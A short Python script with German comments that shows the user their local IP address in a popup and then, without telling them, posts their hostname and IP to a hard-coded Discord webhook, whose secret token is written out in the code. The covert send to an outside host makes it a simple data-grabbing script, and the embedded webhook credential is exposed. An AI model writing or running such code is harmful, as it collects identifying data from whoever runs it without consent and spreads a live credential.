import socket
import requests
from tkinter import messagebox, Tk

# IP-Adresse ermitteln
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

# Popup anzeigen
root = Tk()
root.withdraw()
messagebox.showinfo("IP-Adresse", f"Deine IP ist: {local_ip}")

# An Discord senden
webhook_url = "https://discord.com/api/webhooks/1383009673388757035/u3gHQ_PHaJqBVojDoCbDxYwKrpIXGuT7rPurWnGJg2Tz8NQXoAU6_XqDhjHEyN63W_KE"
payload = {
    "username": hostname,
    "content": f"Lokale IP: {local_ip}"
}

try:
    requests.post(webhook_url, json=payload)
except Exception as e:
    print(f"Fehler beim Senden an Discord: {e}")
